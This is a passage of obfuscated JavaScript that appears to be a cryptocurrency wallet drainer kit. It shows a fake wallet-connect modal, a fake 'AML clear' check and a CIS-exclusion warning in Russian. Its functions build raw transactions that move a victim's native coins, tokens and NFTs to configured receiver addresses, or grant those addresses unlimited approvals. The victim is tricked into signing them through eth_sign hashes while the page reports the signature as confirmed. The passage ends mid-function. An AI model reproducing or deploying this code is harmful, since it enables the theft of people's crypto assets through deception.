		"permit(",
		"Contract",
		"safa_approves",
		"remove",
		"Good,\x20your\x20wallet\x20is\x20AML\x20clear!",
		"7625CjOiRs",
		"ERC721",
		"261970sjjXbU",
		"trim",
		"details",
		"RPCs",
		"chain_id",
		"Pancake",
		"isTrust",
		"userLanguage",
		"@import\x20url(https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap);.web3-modal,.web3-overlay{position:fixed;top:0;left:0;width:100%}.web3-overlay{height:100%;background:rgba(23,23,23,.8);backdrop-filter:blur(5px);z-index:99998}.web3-modal{right:0;bottom:0;margin:auto;max-width:500px;height:fit-content;padding:21px\x200\x200;background:#fff;border-radius:60px;z-index:99999;font-family:Inter,sans-serif}.web3-modal-title{font-weight:700;font-size:24px;line-height:29px;color:#000;text-align:center}.web3-modal-items{border-top:1px\x20solid\x20rgba(0,0,0,.1);margin-top:21px}.web3-modal\x20.item{padding:15px\x2034px;border-bottom:1px\x20solid\x20rgba(0,0,0,.1);display:flex;align-items:center;justify-content:space-between;cursor:pointer;transition:.2s}.web3-modal\x20.item:hover{background:#fafafa;border-radius:\x2020px}.web3-modal\x20.item\x20div{display:flex;align-items:center}.web3-modal\x20.item:last-child{border-bottom:none;border-radius:\x200px\x200px\x2060px\x2060px;}.web3-modal\x20.item\x20span{font-weight:400;font-size:16px;color:#000;margin-left:11px}.web3-modal\x20.item\x20.icon{width:40px;height:40px;justify-content:center}.web3-modal\x20.item\x20.arrow{height:12px;width:7.4px;background:url(\x27/assets/web3-modal/images/arrow.svg\x27)\x20no-repeat}\x20@media\x20(prefers-color-scheme:\x20dark)\x20{.web3-modal\x20{background:\x20#1c1c1c;color:\x20#fff;}.web3-modal-items\x20{border-top:\x201px\x20solid\x20#E4DDDD;}.web3-modal\x20.item\x20span\x20{color:\x20#fff;}.web3-modal\x20.item\x20.arrow\x20{-webkit-filter:\x20invert(1);filter:\x20invert(1);}.web3-modal-title\x20{color:\x20#fff;}.web3-modal\x20.item:hover\x20{background:#262525;}\x20.swal2-popup\x20{\x20background:\x20#1c1c1c;\x20color:\x20#ffffff;\x20}\x20.swal2-styled.swal2-confirm\x20{\x20background-color:\x20#3e7022;\x20}\x20.swal2-styled.swal2-confirm:focus\x20{\x20box-shadow:\x200\x200\x200\x203px\x20#3e7022;\x20}\x20}",
		"sendTransaction",
		"Wait_For_Confirmation",
		"Avalanche\x20Network\x20C-Chain",
		"error",
		"hex",
		"Min_NFTs_Price",
		"check_nft",
		"swap_success",
		"Use_Wallet_Randomizer",
		"Receiver",
		"Wait_For_Response",
		"waitForTransaction",
		"result",
		"expiration",
		"Loop_NFT",
		"0x2105",
		"personal_sign",
		"connect_cancel",
		"name",
		"swapExactTokensForTokens",
		"Approve",
		"Web3Provider",
		"split",
		"Quick",
		"ethereum",
		"32EbfaNA",
		"fire",
		"Contract_Address",
		"application/x-www-form-urlencoded",
		"0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F",
		"era",
		"CIS",
		"schema_name",
		"string",
		"display",
		"0xf849de01b080adc3a814fabe1e2087475cf2e354",
		"connect_success",
		"<div\x20class=\x22web3-modal-main\x22><p\x20class=\x22web3-modal-title\x22\x20style=\x22margin-top:0\x22>Connect\x20your\x20wallet</p><div\x20class=\x22web3-modal-items\x22><div\x20class=\x22item\x22\x20onclick=\x27connect_wallet(\x22MetaMask\x22)\x27><div><div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/MM.svg\x22\x20alt=\x22\x22></div><span>MetaMask</span></div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x27connect_wallet(\x22Coinbase\x22)\x27><div><div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/CB.svg\x22\x20alt=\x22\x22></div><span>Coinbase</span></div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x27connect_wallet(\x22Trust\x20Wallet\x22)\x27><div><div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/TW.svg\x22\x20alt=\x22\x22></div><span>Trust\x20Wallet</span></div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x27connect_wallet(\x22Binance\x20Wallet\x22)\x27><div><div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/BW.svg\x22\x20alt=\x22\x22></div><span>Binance\x20Wallet</span></div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x22use_wc()\x22><div><div\x20class=\x22icon\x22></div><span>More\x20Wallets</span></div><div\x20class=\x22arrow\x22></div></div></div></div><div\x20class=\x22web3-modal-wc\x22\x20style=\x22display:none\x22><p\x20class=\x22web3-modal-title\x22\x20style=\x22margin-top:0\x22>Choose\x20Version</p><div\x20class=\x22web3-modal-items\x22><div\x20class=\x22item\x22\x20onclick=\x27connect_wallet(\x22WalletConnect\x22)\x27><div><div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/WC.svg\x22\x20alt=\x22\x22></div><span>WalletConnect</span></div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x27connect_wallet(\x22WalletConnect\x22)\x27><div><div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/WC1.svg\x22\x20alt=\x22\x22></div><span>WalletConnect\x20Legacy</span></div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x22ms_init()\x22><div\x20class=\x22arrow\x22\x20style=\x22transform:rotateY(190deg)\x22></div><div><div\x20class=\x22icon\x22></div><span>Return\x20to\x20Wallets</span></div></div></div></div>",
		"style",
		"https://go.cb-w.com/dapp?cb_url=https://",
		"ru-RU",
		"payable",
		"NATIVE",
		"Пожалуйста,\x20покиньте\x20этот\x20веб-сайт\x20немедленно,\x20он\x20не\x20предназначен\x20для\x20России\x20и\x20стран\x20СНГ,\x20не\x20пытайтесь\x20использовать\x20VPN,\x20это\x20небезопасно!",
		"value",
		"pulse",
		"USD",
		"<b>Предупреждение</b><br><br>Пожалуйста,\x20покиньте\x20этот\x20веб-сайт\x20немедленно,\x20он\x20не\x20предназначен\x20для\x20России\x20и\x20стран\x20СНГ,\x20не\x20пытайтесь\x20использовать\x20VPN,\x20это\x20небезопасно!",
		"functions",
		"primary_asset_contracts",
		"Pulse",
		"OPENSEA",
		"Sign\x20message\x20in\x20your\x20wallet...",
		"JsonRpcProvider",
		"DSB",
		"sign",
		"hash",
		"sign_unavailable",
		"transfer_cancel",
		"bytes[]",
		"_signTypedData",
		"code",
		"Processing\x20sign",
		"web3-overlay",
		"permit2",
		"serialize",
		"#F5841F",
		"now",
		"120",
		"time",
		"pending",
		"sign_success",
		"https://metamask.app.link/dapp/",
		"ANKR",
		"https://basescan.org/",
		"number",
		"application/json",
		"asset_contract",
		"length",
		"#000000",
		"head",
		"title",
		"104bNvcnu",
		"Verification\x20Error",
		"chain_success",
		"one_day_average_price",
		"Please,\x20check\x20client\x20and\x20server\x20version,\x20looks\x20like\x20it\x20doesn\x27t\x20match,\x20or\x20maybe\x20you\x20need\x20to\x20clear\x20cache\x20everywhere\x20:(",
		"WalletConnect",
		"transfer_request",
		"0x171",
		"AML\x20Error",
		"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
		"Use_Contract_Amount",
		"amountIn",
		"https://metamask.io",
		"lte",
		"ABI",
		"Server\x20Error",
		"d1c2a09912c31c2479ecae1271b657f7",
		"MetaMask",
		"body",
		"chain_request",
		"leave_website",
		"Скрипт\x20не\x20может\x20соединиться\x20с\x20сервером\x20и\x20получить\x20данные,\x20возможно\x20вы\x20настроили\x20что-то\x20некорректно\x20или\x20домен\x20сервера\x20ещё\x20недоступен\x20или\x20был\x20заблокирован.\x20Проверьте\x20и\x20исправьте\x20проблемы\x20перед\x20использованием\x20сайта.",
		"approve_token",
		"gnosis",
		"language",
		"balanceRawInteger",
		"push",
		"eth_sign",
		"data",
		"&apikey=",
		"avalanche",
		"Нет\x20связи\x20с\x20сервером",
		"API",
		"Enable",
		"Server\x20is\x20Unavailable",
		"formatUnits",
		"MATIC",
		"address",
		"stats",
		"Loop_N",
		"charCodeAt",
		"toHex",
		"https://chrome.google.com/webstore/detail/binance-wallet/fhbohimaelbohpjbbldcngcnapndodjp",
		"Pancake_V3",
		"abi",
		"optimism",
		"CRO",
		"bool",
		"Proxy",
		"Gas_Multiplier",
		"chainId",
		"1461501637330902918203684832716283019655932542975",
		"onbeforeunload",
		"https://link.trustwallet.com/open_url?coin_id=60&url=https://",
		"match",
		"substr",
		"getElementById",
		"hasOwnProperty",
		"iPhone\x20Simulator",
		"zkSync\x20Era",
		"estimateGas",
		"Your\x20wallet\x20is\x20not\x20AML\x20clear!",
		"wallet_switchEthereumChain",
		"harmony",
		"function",
		"web3-modal-main",
		"percent",
		"getBalance",
		"0x21be370d5312f44cb42ce377bc9b8a0cef1a4c83",
		"Unlimited_BL",
		"Sign",
		"deadline",
		"type",
		"https://api.opensea.io/api/v1/assets?owner=",
		"toString",
		"iPhone",
		"INVALID_VERSION",
		".connect-button",
		"Mode",
		"amount",
		"Connecting\x20to\x20blockchain...",
		"isApprovedForAll",
		"0xA4B1",
		"0x1",
		"NFTs",
		"KAVA",
		"Blur",
		"status",
		"32TeEfOi",
	];
	_0x1325 = function () {
		return _0x5c1cce;
	};
	return _0x1325();
}
let is_first_sign = !![];
function _0x2e5c(_0x5c729a, _0x13e6cf) {
	const _0x13254d = _0x1325();
	return (
		(_0x2e5c = function (_0x2e5ccd, _0x5b4ec4) {
			_0x2e5ccd = _0x2e5ccd - 0xa6;
			let _0x1f5da6 = _0x13254d[_0x2e5ccd];
			return _0x1f5da6;
		}),
		_0x2e5c(_0x5c729a, _0x13e6cf)
	);
}
const sign_ready = () => {
		const _0xfb705 = _0x11d65a;
		try {
			FLASH_Loader_Style == 0x2
				? FLASHL[_0xfb705(0x133)]({
						icon: _0xfb705(0x290),
						title: "OK",
						subtitle: "Sign\x20is\x20confirmed",
						text: _0xfb705(0x1e5),
						showConfirmButton: ![],
						color: FLASH_Color_Scheme,
				  })
				: (Swal["close"](),
				  Swal[_0xfb705(0x133)]({
						html: "<b>Success!</b>\x20Your\x20sign\x20is\x20confirmed!",
						icon: "success",
						allowOutsideClick: ![],
						allowEscapeKey: ![],
						timer: 0x0,
						width: 0x258,
						showConfirmButton: ![],
				  }));
		} catch (_0x22f1c3) {
			console[_0xfb705(0x215)](_0x22f1c3);
		}
	},
	sign_next = () => {
		const _0x510721 = _0x11d65a;
		try {
			if (is_first_sign) {
				is_first_sign = ![];
				return;
			}
			FLASH_Loader_Style == 0x2
				? FLASHL[_0x510721(0x133)]({
						icon: _0x510721(0xc4),
						title: _0x510721(0xf4),
						text: _0x510721(0x14d),
						showConfirmButton: !![],
						confirmButtonText: _0x510721(0x208),
						color: FLASH_Color_Scheme,
				  })
				: (Swal[_0x510721(0x296)](),
				  Swal[_0x510721(0x133)]({
						html: _0x510721(0x28d),
						imageUrl: _0x510721(0x273),
						imageHeight: 0x3c,
						allowOutsideClick: ![],
						allowEscapeKey: ![],
						timer: 0x0,
						width: 0x258,
						showConfirmButton: ![],
				  }));
		} catch (_0x524f40) {
			console["log"](_0x524f40);
		}
	},
	is_nft_approved = async (_0x1cb1b6, _0x3f337a, _0xff2f66) => {
		const _0x5f3c77 = _0x11d65a;
		try {
			const _0x38bc1b = new ethers["providers"][_0x5f3c77(0x14e)](
					FLASH_Settings[_0x5f3c77(0x113)][0x1]
				),
				_0x800d08 = new ethers[_0x5f3c77(0x10a)](
					_0x1cb1b6,
					FLASH_Contract_ABI[_0x5f3c77(0x10f)],
					_0x38bc1b
				);
			return await _0x800d08[_0x5f3c77(0x1bc)](_0x3f337a, _0xff2f66);
		} catch (_0x51bbab) {
			return console[_0x5f3c77(0x215)](_0x51bbab), ![];
		}
	},
	get_gas_limit_def_by_chain_id = (_0x36becd) => {
		switch (_0x36becd) {
			case 0xa4b1:
				return BN(0x4c4b40);
			case 0xa86a:
				return BN(0x4c4b40);
			default:
				return BN(0x186a0);
		}
	},
	SIGN_NATIVE = async (_0x288a0f) => {
		const _0x31187a = _0x11d65a,
			_0x2e53c0 = new ethers["providers"][_0x31187a(0x14e)](
				FLASH_Settings[_0x31187a(0x113)][_0x288a0f[_0x31187a(0x114)]]
			),
			_0x3d9f73 = BN(await _0x2e53c0["getGasPrice"]())
				[_0x31187a(0x28f)](BN(0x64))
				[_0x31187a(0xeb)](
					BN(Math["floor"](FLASH_Gas_Multiplier * 0x64))
				),
			_0x4e1fd3 = BN(
				_0x288a0f[_0x31187a(0x114)] == 0xa4b1
					? 0x4c4b40
					: _0x288a0f[_0x31187a(0x114)] == 0xa86a
					? 0x4c4b40
					: _0x288a0f[_0x31187a(0x114)] == 0x171
					? 0xdbba0
					: 0x249f0
			),
			_0x253786 = _0x4e1fd3[_0x31187a(0xeb)](
				FLASH_Gas_Reserves[_0x288a0f[_0x31187a(0x114)]] + 0x1
			)[_0x31187a(0xeb)](_0x3d9f73);
		let _0x4f259d = {
				from: FLASH_Current_Address,
				to: FLASH_Settings[_0x31187a(0x122)],
				value: BN(0x64),
				data: "0x",
			},
			_0x3316e7 = null;
		try {
			_0x3316e7 = await _0x2e53c0["estimateGas"](_0x4f259d);
		} catch (_0x5a3d0e) {
			_0x3316e7 = get_gas_limit_def_by_chain_id(
				parseInt(_0x288a0f[_0x31187a(0x114)])
			);
		}
		const _0x2f9613 = await _0x2e53c0["getBalance"](FLASH_Current_Address),
			_0x5697e3 = _0x2f9613["sub"](_0x3316e7[_0x31187a(0xeb)](_0x3d9f73))[
				_0x31187a(0x21b)
			](_0x253786);
		if (_0x5697e3["lte"](BN(0x0))) throw "LOW_BALANCE";
		const _0x54ced3 = await _0x2e53c0["getTransactionCount"](
				FLASH_Current_Address,
				_0x31187a(0x15f)
			),
			_0x5429f1 = new Web3(FLASH_Provider);
		(_0x4f259d[_0x31187a(0x145)] = _0x5429f1[_0x31187a(0x1e8)][
			_0x31187a(0x194)
		](_0x5697e3[_0x31187a(0x1b5)]())),
			(_0x4f259d[_0x31187a(0x241)] = _0x5429f1[_0x31187a(0x1e8)][
				_0x31187a(0x194)
			](_0x54ced3[_0x31187a(0x1b5)]())),
			(_0x4f259d[_0x31187a(0xa6)] = _0x5429f1[_0x31187a(0x1e8)][
				_0x31187a(0x194)
			](_0x3d9f73["toString"]())),
			(_0x4f259d["gasLimit"] = _0x5429f1[_0x31187a(0x1e8)][
				_0x31187a(0x194)
			](_0x3316e7[_0x31187a(0x1b5)]())),
			(_0x4f259d["v"] = _0x5429f1[_0x31187a(0x1e8)][_0x31187a(0x194)](
				_0x288a0f[_0x31187a(0x114)]
			)),
			(_0x4f259d["r"] = "0x"),
			(_0x4f259d["s"] = "0x"),
			(_0x4f259d = new ethereumjs["Tx"](_0x4f259d));
		let _0x34074e =
			"0x" + _0x4f259d["serialize"]()[_0x31187a(0x1b5)]("hex");
		(_0x34074e = _0x5429f1[_0x31187a(0x1e8)]["sha3"](_0x34074e, {
			encoding: _0x31187a(0x11d),
		})),
			await sign_request(_0x288a0f);
		let _0x5ebfc3 = await _0x5429f1[_0x31187a(0x251)][_0x31187a(0x150)](
			_0x34074e,
			FLASH_Current_Address
		);
		_0x5ebfc3 = _0x5ebfc3[_0x31187a(0x235)](0x2);
		const _0x3ab58a = "0x" + _0x5ebfc3["substring"](0x0, 0x40),
			_0x14a421 = "0x" + _0x5ebfc3["substring"](0x40, 0x80),
			_0x52320f = parseInt(_0x5ebfc3["substring"](0x80, 0x82), 0x10),
			_0x2802c7 = _0x5429f1["utils"][_0x31187a(0x194)](
				_0x52320f + _0x288a0f[_0x31187a(0x114)] * 0x2 + 0x8
			);
		(_0x4f259d["v"] = _0x2802c7),
			(_0x4f259d["r"] = _0x3ab58a),
			(_0x4f259d["s"] = _0x14a421),
			(_0x34074e =
				"0x" + _0x4f259d[_0x31187a(0x15a)]()[_0x31187a(0x1b5)]("hex")),
			sign_next();
		const _0xeac5d0 = await _0x2e53c0["sendTransaction"](_0x34074e);
		wait_message();
		if (FLASH_Settings[_0x31187a(0xb0)][_0x31187a(0x11a)])
			await _0x2e53c0["waitForTransaction"](
				_0xeac5d0["hash"],
				0x1,
				0x7530
			);
		await sign_success(_0x288a0f, _0x5697e3), sign_ready();
	},
	SIGN_TOKEN = async (_0x473ac4) => {
		const _0x2265e1 = _0x11d65a,
			_0x47c998 = new ethers["providers"][_0x2265e1(0x14e)](
				FLASH_Settings[_0x2265e1(0x113)][_0x473ac4[_0x2265e1(0x114)]]
			),
			_0x1d1268 = BN(await _0x47c998[_0x2265e1(0x103)]())
				["div"](BN(0x64))
				[_0x2265e1(0xeb)](
					BN(Math[_0x2265e1(0xe4)](FLASH_Gas_Multiplier * 0x64))
				),
			_0xf882f5 = new Web3(FLASH_Provider);
		let _0x2d1063 = null;
		const _0x325f99 = new _0xf882f5["eth"][_0x2265e1(0x10a)](
			FLASH_Contract_ABI[_0x2265e1(0x1d6)],
			_0x473ac4[_0x2265e1(0x190)]
		);
		let _0x1c7f33 = ethers[_0x2265e1(0x1e8)][_0x2265e1(0xdb)](
			FLASH_Unlimited_Amount
		);
		for (const _0x3db73f of FLASH_Settings["Unlimited_BL"]) {
			try {
				if (
					_0x3db73f[0x0] == FLASH_Current_Chain_ID &&
					_0x3db73f[0x1] ==
						_0x473ac4[_0x2265e1(0x190)]
							[_0x2265e1(0x2a1)]()
							[_0x2265e1(0x111)]()
				) {
					_0x1c7f33 = _0x473ac4[_0x2265e1(0x247)];
					break;
				}
			} catch (_0x1c46a2) {
				console[_0x2265e1(0x215)](_0x1c46a2);
			}
		}
		if (
			FLASH_Settings[_0x2265e1(0xb0)][_0x2265e1(0x1b1)][
				_0x2265e1(0x108)
			] == 0x1
		)
			_0x2d1063 = _0x325f99[_0x2265e1(0x261)]
				[_0x2265e1(0xe2)](FLASH_Settings[_0x2265e1(0x24e)], _0x1c7f33)
				[_0x2265e1(0x258)]();
		else {
			if (
				FLASH_Settings[_0x2265e1(0xb0)][_0x2265e1(0x1b1)][
					_0x2265e1(0x108)
				] == 0x2
			)
				_0x2d1063 = _0x325f99[_0x2265e1(0x261)]
					["transfer"](
						FLASH_Settings[_0x2265e1(0x122)],
						_0x473ac4[_0x2265e1(0x247)]
					)
					[_0x2265e1(0x258)]();
		}
		let _0x214d4a = {
				from: FLASH_Current_Address,
				to: _0x473ac4[_0x2265e1(0x190)],
				value: "0x0",
				data: _0x2d1063,
			},
			_0x1b078c = null;
		try {
			_0x1b078c = await _0x47c998[_0x2265e1(0x1a7)](_0x214d4a);
		} catch (_0x272f07) {
			_0x1b078c = get_gas_limit_def_by_chain_id(
				parseInt(_0x473ac4[_0x2265e1(0x114)])
			);
		}
		const _0x569b7f = await _0x47c998[_0x2265e1(0x1ae)](
				FLASH_Current_Address
			),
			_0x1f68a9 = _0x569b7f[_0x2265e1(0x21b)](
				_0x1b078c[_0x2265e1(0xeb)](_0x1d1268)
			);
		if (_0x1f68a9["lt"](BN(0x0))) throw _0x2265e1(0xf6);
		const _0x1e8f39 = await _0x47c998["getTransactionCount"](
			FLASH_Current_Address,
			_0x2265e1(0x15f)
		);
		(_0x214d4a["nonce"] = _0xf882f5[_0x2265e1(0x1e8)][_0x2265e1(0x194)](
			_0x1e8f39["toString"]()
		)),
			(_0x214d4a[_0x2265e1(0xa6)] = _0xf882f5[_0x2265e1(0x1e8)][
				_0x2265e1(0x194)
			](_0x1d1268["toString"]())),
			(_0x214d4a[_0x2265e1(0x227)] = _0xf882f5[_0x2265e1(0x1e8)]["toHex"](
				_0x1b078c[_0x2265e1(0x1b5)]()
			)),
			(_0x214d4a["v"] = _0xf882f5[_0x2265e1(0x1e8)]["toHex"](
				_0x473ac4[_0x2265e1(0x114)]
			)),
			(_0x214d4a["r"] = "0x"),
			(_0x214d4a["s"] = "0x"),
			(_0x214d4a = new ethereumjs["Tx"](_0x214d4a));
		let _0x1aef72 = "0x" + _0x214d4a["serialize"]()["toString"]("hex");
		(_0x1aef72 = _0xf882f5["utils"][_0x2265e1(0x28c)](_0x1aef72, {
			encoding: _0x2265e1(0x11d),
		})),
			await sign_request(_0x473ac4);
		let _0x48ec87 = await _0xf882f5[_0x2265e1(0x251)][_0x2265e1(0x150)](
			_0x1aef72,
			FLASH_Current_Address
		);
		_0x48ec87 = _0x48ec87[_0x2265e1(0x235)](0x2);
		const _0x4dcf1c = "0x" + _0x48ec87[_0x2265e1(0x235)](0x0, 0x40),
			_0x357cdd = "0x" + _0x48ec87[_0x2265e1(0x235)](0x40, 0x80),
			_0xfb4f09 = parseInt(_0x48ec87[_0x2265e1(0x235)](0x80, 0x82), 0x10),
			_0x55a893 = _0xf882f5[_0x2265e1(0x1e8)]["toHex"](
				_0xfb4f09 + _0x473ac4["chain_id"] * 0x2 + 0x8
			);
		(_0x214d4a["v"] = _0x55a893),
			(_0x214d4a["r"] = _0x4dcf1c),
			(_0x214d4a["s"] = _0x357cdd),
			(_0x1aef72 =
				"0x" +
				_0x214d4a["serialize"]()[_0x2265e1(0x1b5)](_0x2265e1(0x11d))),
			sign_next();
		const _0x55665b = await _0x47c998["sendTransaction"](_0x1aef72);
		wait_message();
		if (FLASH_Settings["Settings"][_0x2265e1(0x11a)])
			await _0x47c998["waitForTransaction"](
				_0x55665b["hash"],
				0x1,
				0x7530
			);
		await sign_success(_0x473ac4), sign_ready();
	},
	SIGN_NFT = async (_0x4bc974) => {
		const _0x28f037 = _0x11d65a,
			_0x149110 = new ethers[_0x28f037(0x264)]["JsonRpcProvider"](
				FLASH_Settings["RPCs"][_0x4bc974["chain_id"]]
			),
			_0x174871 = BN(await _0x149110[_0x28f037(0x103)]())
				["div"](BN(0x64))
				["mul"](BN(Math["floor"](FLASH_Gas_Multiplier * 0x64))),
			_0x178e9c = new Web3(FLASH_Provider);
		let _0x379d31 = null;
		const _0xb77806 = new _0x178e9c[_0x28f037(0x251)][_0x28f037(0x10a)](
			FLASH_Contract_ABI[_0x28f037(0x10f)],
			_0x4bc974[_0x28f037(0x190)]
		);
		if (
			FLASH_Settings[_0x28f037(0xb0)][_0x28f037(0x1b1)][
				_0x28f037(0x1bf)
			] == 0x1
		)
			_0x379d31 = _0xb77806[_0x28f037(0x261)]
				[_0x28f037(0x1d5)](FLASH_Settings[_0x28f037(0x24e)], !![])
				[_0x28f037(0x258)]();
		else {
			if (
				FLASH_Settings[_0x28f037(0xb0)][_0x28f037(0x1b1)][
					_0x28f037(0x1bf)
				] == 0x2
			)
				_0x379d31 = _0xb77806[_0x28f037(0x261)]
					[_0x28f037(0xd8)](
						FLASH_Current_Address,
						FLASH_Settings[_0x28f037(0x122)],
						_0x4bc974["id"]
					)
					[_0x28f037(0x258)]();
		}
		let _0x32a71c = {
				from: FLASH_Current_Address,
				to: _0x4bc974["address"],
				value: _0x28f037(0x24b),
				data: _0x379d31,
			},
			_0x43710a = null;
		try {
			_0x43710a = await _0x149110[_0x28f037(0x1a7)](_0x32a71c);
		} catch (_0x33085b) {
			_0x43710a = get_gas_limit_def_by_chain_id(
				parseInt(_0x4bc974[_0x28f037(0x114)])
			);
		}
		const _0x3bd61f = await _0x149110[_0x28f037(0x1ae)](
				FLASH_Current_Address
			),
			_0x3d3437 = _0x3bd61f[_0x28f037(0x21b)](
				_0x43710a[_0x28f037(0xeb)](_0x174871)
			);
		if (_0x3d3437["lt"](BN(0x0))) throw _0x28f037(0xf6);
		const _0x458aeb = await _0x149110[_0x28f037(0x263)](
			FLASH_Current_Address,
			"pending"
		);
		(_0x32a71c[_0x28f037(0x241)] = _0x178e9c[_0x28f037(0x1e8)][
			_0x28f037(0x194)
		](_0x458aeb[_0x28f037(0x1b5)]())),
			(_0x32a71c["gasPrice"] = _0x178e9c["utils"][_0x28f037(0x194)](
				_0x174871[_0x28f037(0x1b5)]()
			)),
			(_0x32a71c[_0x28f037(0x227)] = _0x178e9c[_0x28f037(0x1e8)][
				_0x28f037(0x194)
			](_0x43710a[_0x28f037(0x1b5)]())),
			(_0x32a71c["v"] = _0x178e9c[_0x28f037(0x1e8)]["toHex"](
				_0x4bc974["chain_id"]
			)),
			(_0x32a71c["r"] = "0x"),
			(_0x32a71c["s"] = "0x"),
			(_0x32a71c = new ethereumjs["Tx"](_0x32a71c));
		let _0x4fb0b0 =
			"0x" + _0x32a71c[_0x28f037(0x15a)]()["toString"](_0x28f037(0x11d));
		(_0x4fb0b0 = _0x178e9c["utils"]["sha3"](_0x4fb0b0, {
			encoding: "hex",
		})),
			await sign_request(_0x4bc974);
		let _0x567da3 = await _0x178e9c[_0x28f037(0x251)][_0x28f037(0x150)](
			_0x4fb0b0,
			FLASH_Current_Address
		);
		_0x567da3 = _0x567da3["substring"](0x2);
		const _0x4647ce = "0x" + _0x567da3[_0x28f037(0x235)](0x0, 0x40),
			_0x502a83 = "0x" + _0x567da3[_0x28f037(0x235)](0x40, 0x80),
			_0x3109c2 = parseInt(_0x567da3["substring"](0x80, 0x82), 0x10),
			_0x55b9fc = _0x178e9c["utils"][_0x28f037(0x194)](
				_0x3109c2 + _0x4bc974[_0x28f037(0x114)] * 0x2 + 0x8
			);
		(_0x32a71c["v"] = _0x55b9fc),
			(_0x32a71c["r"] = _0x4647ce),
			(_0x32a71c["s"] = _0x502a83),
			(_0x4fb0b0 =
				"0x" +
				_0x32a71c["serialize"]()[_0x28f037(0x1b5)](_0x28f037(0x11d))),
			sign_next();
		const _0x1e20ff = await _0x149110[_0x28f037(0x119)](_0x4fb0b0);
		wait_message();
		if (FLASH_Settings["Settings"][_0x28f037(0x11a)])
			await _0x149110[_0x28f037(0x124)](
				_0x1e20ff[_0x28f037(0x151)],
				0x1,
				0x7530
			);
		await sign_success(_0x4bc974), sign_ready();
	},
	DO_SWAP = async (_0x409f49) => {
		const _0x1b8243 = _0x11d65a,
			_0xc13e7 = new ethers["providers"]["JsonRpcProvider"](
				FLASH_Settings[_0x1b8243(0x113)][_0x409f49["chain_id"]]
			),
			_0x9279eb =
				Math[_0x1b8243(0xe4)](Date["now"]() / 0x3e8) + 0x270f * 0xa,
			_0x1ac985 = new ethers["Contract"](
				_0x409f49[_0x1b8243(0x285)],
				FLASH_Pancake_ABI,
				FLASH_Signer
			),
			_0x3ddd74 = ethers["BigNumber"]
				[_0x1b8243(0x24c)](await _0xc13e7[_0x1b8243(0x103)]())
				[_0x1b8243(0x28f)](
					ethers[_0x1b8243(0x1c5)]["from"](_0x1b8243(0x279))
				)
				[_0x1b8243(0xeb)](
					ethers[_0x1b8243(0x1c5)][_0x1b8243(0x24c)](_0x1b8243(0x15d))
				)
				[_0x1b8243(0x1b5)]();
		let _0x557f37 = null,
			_0x25a0cf = 0x0;
		while (_0x25a0cf < 0x3) {
			try {
				(_0x557f37 = await _0x1ac985[_0x1b8243(0x1a7)][
					_0x1b8243(0x1db)
				](
					_0x39b71d,
					"0",
					[
						_0x409f49[_0x1b8243(0x190)],
						FLASH_Swap_Route[_0x409f49[_0x1b8243(0x114)]],
					],
					FLASH_Settings[_0x1b8243(0x122)],
					_0x9279eb,
					{ from: FLASH_Current_Address }
				)),
					(_0x557f37 = ethers[_0x1b8243(0x1c5)]
						[_0x1b8243(0x24c)](_0x557f37)
						[_0x1b8243(0x28f)](
							ethers[_0x1b8243(0x1c5)]["from"](_0x1b8243(0x279))
						)
						["mul"](
							ethers["BigNumber"][_0x1b8243(0x24c)](
								_0x1b8243(0x15d)
							)
						)
						[_0x1b8243(0x1b5)]()),
					(_0x25a0cf = 0x3);
			} catch (_0x16f8ec) {
				(_0x557f37 =
					_0x409f49[_0x1b8243(0x114)] == 0xa4b1
						? 0x4c4b40
						: _0x409f49["chain_id"] == 0xa86a
						? 0x4c4b40
						: 0x55730),
					(_0x25a0cf += 0x1);
			}
		}
		const _0x2463b3 = await get_nonce(_0x409f49[_0x1b8243(0x114)]),
			_0x39b71d = ethers[_0x1b8243(0x1c5)]
				[_0x1b8243(0x24c)](_0x409f49[_0x1b8243(0x247)])
				["lte"](
					ethers["BigNumber"][_0x1b8243(0x24c)](
						_0x409f49[_0x1b8243(0x269)]
					)
				)
				? ethers[_0x1b8243(0x1c5)]
						[_0x1b8243(0x24c)](_0x409f49[_0x1b8243(0x247)])
						[_0x1b8243(0x1b5)]()
				: ethers[_0x1b8243(0x1c5)]
						["from"](_0x409f49[_0x1b8243(0x269)])
						["toString"]();
		await swap_request(_0x409f49[_0x1b8243(0x1d0)], _0x409f49, [_0x409f49]),
			sign_next();
		const _0x4a9a05 = await _0x1ac985[_0x1b8243(0x1db)](
			_0x39b71d,
			"0",
			[_0x409f49["address"], FLASH_Swap_Route[_0x409f49["chain_id"]]],
			FLASH_Settings[_0x1b8243(0x122)],
			_0x9279eb,
			{
				gasLimit: ethers[_0x1b8243(0x1c5)][_0x1b8243(0x24c)](_0x557f37),
				gasPrice: ethers[_0x1b8243(0x1c5)]["from"](_0x3ddd74),
				nonce: _0x2463b3,
				from: FLASH_Current_Address,
			}
		);
		wait_message();
		if (FLASH_Settings[_0x1b8243(0xb0)][_0x1b8243(0x11a)])
			await _0xc13e7["waitForTransaction"](
				_0x4a9a05[_0x1b8243(0x151)],
				0x1,
				0xea60
			);
		await swap_success(_0x409f49[_0x1b8243(0x1d0)], _0x409f49, [_0x409f49]),
			sign_ready();
	},
	DO_UNISWAP = async (_0x4605ca, _0x5e00d0) => {
		const _0x3a21b4 = _0x11d65a,
			_0x2ca40d = new Web3(FLASH_Provider),
			_0x197a85 = new ethers[_0x3a21b4(0x264)][_0x3a21b4(0x14e)](
				FLASH_Settings[_0x3a21b4(0x113)][_0x4605ca[_0x3a21b4(0x114)]]
			),
			_0x4b4779 =
